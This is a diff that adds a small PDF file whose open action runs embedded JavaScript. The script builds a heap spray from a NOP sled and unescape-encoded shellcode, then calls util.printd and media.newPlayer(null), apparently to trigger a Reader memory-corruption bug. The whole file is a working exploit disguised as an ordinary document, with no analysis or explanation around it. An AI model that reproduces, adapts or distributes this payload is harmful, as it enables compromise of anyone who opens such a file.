@@ -1,0 +1,59 @@
+%PDF-1.1
+1 0 obj
+<< /Type /Catalog /Outlines 2 0 R /Pages 3 0 R /OpenAction 5 0 R >>
+endobj
+2 0 obj
+<< /Type /Outlines /Count 0 >>
+endobj
+3 0 obj
+<< /Type /Pages /Kids [4 0 R] /Count 1 >>
+endobj
+4 0 obj
+<< /Type /Page /Parent 3 0 R /MediaBox [0 0 612 792] >>
+endobj
+5 0 obj
+<< /Type /Action /S /JavaScript /JS (
+        
+        function spray_heap()
+        {
+            var chunk_size, payload, nopsled;
+            
+            chunk_size = 0x8000;
+            payload = unescape("%uc931%ue983%ud9dd%ud9ee%u2474%u5bf4%u7381%u6f13%ub102%u830e%ufceb%uf4e2%uea93%u0ef5%u026f%u4b3a%u8953%u0bcd%u0317%u855e%u1a20%u513a%u034f%u475a%u36e4%u0f3a%u3381%u9771%u86c3%u7a71%uc368%u037b%uc06e%ufa5a%u5654%u0a95%ue71a%u513a%u034b%u685a%u0ee4%u85fa%u1e30%ue5b0%u1ee4%u0f3a%u8b84%u2aed%uc16b%uce80%u890b%u3ef1%uc2ea%u02c9%u42e4%u85bd%u1e1f%u851c%u0a07%u075a%u82e4%u0e01%u026f%u663a%u5d53%uf880%u540f%uf638%uc2ec%u5eca%u7c07%uec69%u6a1c%uf029%u0ce5%uf1e6%u6188%u62d0%u2c0c%u76d4%u020a%u0eb1");
+            nopsled = unescape("%u0d0d%u0d0d");
+            while (nopsled.length < chunk_size)
+                nopsled += nopsled;
+            nopsled_len = chunk_size - (payload.length + 20);        
+            nopsled = nopsled.substring(0, nopsled_len);
+            heap_chunks = new Array();
+            for (var i = 0 ; i < 1200 ; i++)
+                heap_chunks[i] = nopsled + payload;
+        }    
+         
+        function trigger_bug()
+        {
+            util.printd("1.000000000000000000000000 : 0000000", new Date());
+            try {
+                media.newPlayer(null);
+            } catch(e) {}
+            util.printd("1.000000000000000000000000 : 0000000", new Date());
+        }
+        
+        spray_heap();
+        trigger_bug();
+        
+        ) >>
+endobj
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000096 00000 n
+0000000145 00000 n
+0000000205 00000 n
+0000000279 00000 n
+trailer
+<< /Size 6 /Root 1 0 R >> 
+startxref
+1787
+%%EOF
